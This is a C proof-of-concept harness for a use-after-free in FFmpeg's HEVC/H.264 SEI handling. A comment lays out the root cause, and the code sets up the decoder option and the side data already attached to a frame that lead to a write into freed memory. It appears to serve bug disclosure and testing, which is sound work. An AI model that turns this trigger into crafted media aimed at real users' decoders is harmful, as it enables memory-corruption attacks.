/*
 * PoC harness for TESTCASE-e41b1ba1b6253578 (UseAfterFree in h2645_sei.c,
 * Ambient Viewing Environment SEI handling).
 *
 * Root cause: in h2645_sei_to_side_data() (libavcodec/h2645_sei.c), the newly
 * allocated AVAmbientViewingEnvironment side-data struct (dst_env) is wrapped
 * in an AVBufferRef (buf) and handed to ff_frame_new_side_data_from_buf_ext()
 * BEFORE its fields are initialized. If the frame already carries side data
 * of type AV_FRAME_DATA_AMBIENT_VIEWING_ENVIRONMENT (e.g. copied from
 * container-level coded side data such as an mp4 'amve' box) and the decoder
 * is configured to prefer that pre-existing side data
 * (side_data_prefer_packet), ff_frame_new_side_data_from_buf_ext() takes the
 * "already exists, keep preferred" path: it unconditionally unrefs (frees)
 * the just-created buffer without adding it, yet returns success (0). The
 * caller then goes on to write dst_env->ambient_illuminance/... into the
 * now-freed buffer: a use-after-free write.
 *
 * This harness drives the exact same exported entry point
 * (ff_h2645_sei_to_frame -> h2645_sei_to_side_data) that the real HEVC/H264
 * decoders call once per decoded frame, with the same preconditions a real
 * decode of a crafted "poc_hvcc_modified.mp4"-style file would create:
 *   1. avcodec_open2() with side_data_prefer_packet=-1, matching the
 *      documented option that makes ff_frame_new_side_data_from_buf_ext()
 *      take the freeing/no-add path for every side data type.
 *   2. An AVFrame that already carries AV_FRAME_DATA_AMBIENT_VIEWING_ENVIRONMENT
 *      side data, matching what ff_decode_frame_props() copies onto every
 *      decoded frame from a stream's coded_side_data (e.g. the mp4 'amve'
 *      box) before the codec's own SEI parsing runs.
 *   3. An H2645SEI with ambient_viewing_environment.present = 1, matching an
 *      Ambient Viewing Environment SEI message (payload type 148) actually
 *      present in the coded bitstream.
 */
#include <string.h>
#include <stdio.h>

#include <libavcodec/avcodec.h>
#include <libavutil/frame.h>
#include <libavutil/dict.h>
#include <libavutil/ambient_viewing_environment.h>
#include <libavcodec/h2645_sei.h>

int main(void)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_HEVC);
    AVCodecContext *avctx;
    AVDictionary *opts = NULL;
    AVFrame *frame;
    AVFrameSideData *sd;
    H2645SEI sei;
    int ret;

    if (!codec) {
        fprintf(stderr, "HEVC decoder not available\n");
        return 1;
    }

    avctx = avcodec_alloc_context3(codec);
    if (!avctx) {
        fprintf(stderr, "alloc context failed\n");
        return 1;
    }

    /* Matches: ffmpeg -side_data_prefer_packet -1 ...
     * This sets dc->side_data_pref_mask = ~0ULL in ff_decode_preinit(),
     * making side_data_pref() report "already present, keep it" for any
     * frame side data type that is already attached to the frame. */
    av_dict_set(&opts, "side_data_prefer_packet", "-1", 0);

    ret = avcodec_open2(avctx, codec, &opts);
    if (ret < 0) {
        char errbuf[128];
        av_strerror(ret, errbuf, sizeof(errbuf));
        fprintf(stderr, "avcodec_open2 failed: %s\n", errbuf);
        return 1;
    }
    av_dict_free(&opts);

    frame = av_frame_alloc();
    if (!frame) {
        fprintf(stderr, "frame alloc failed\n");
        return 1;
    }

    /* Simulate container-level Ambient Viewing Environment side data
     * (e.g. an mp4 'amve' box) already having been attached to this frame
     * by ff_decode_frame_props() before the codec's own SEI parsing runs
     * (ff_decode_frame_props is invoked from ff_get_buffer(), which HEVC's
     * hevc_frame_start() calls before its own set_side_data()/SEI step). */
    sd = av_frame_new_side_data(frame, AV_FRAME_DATA_AMBIENT_VIEWING_ENVIRONMENT,
                                sizeof(AVAmbientViewingEnvironment));
    if (!sd) {
        fprintf(stderr, "failed to pre-attach side data\n");
        return 1;
    }

    /* Simulate an in-bitstream Ambient Viewing Environment SEI message
     * (H.265/H.264 SEI payload type 148) having been parsed for this
     * frame. */
    memset(&sei, 0, sizeof(sei));
    sei.ambient_viewing_environment.present = 1;
    sei.ambient_viewing_environment.ambient_illuminance = 12345;
    sei.ambient_viewing_environment.ambient_light_x = 100;
    sei.ambient_viewing_environment.ambient_light_y = 200;

    fprintf(stderr, "calling ff_h2645_sei_to_frame...\n");
    ret = ff_h2645_sei_to_frame(frame, &sei, AV_CODEC_ID_HEVC, avctx,
                                NULL, 8, 8, 0);
    fprintf(stderr, "ff_h2645_sei_to_frame returned %d (no crash)\n", ret);

    av_frame_free(&frame);
    avcodec_free_context(&avctx);
    return 0;
}
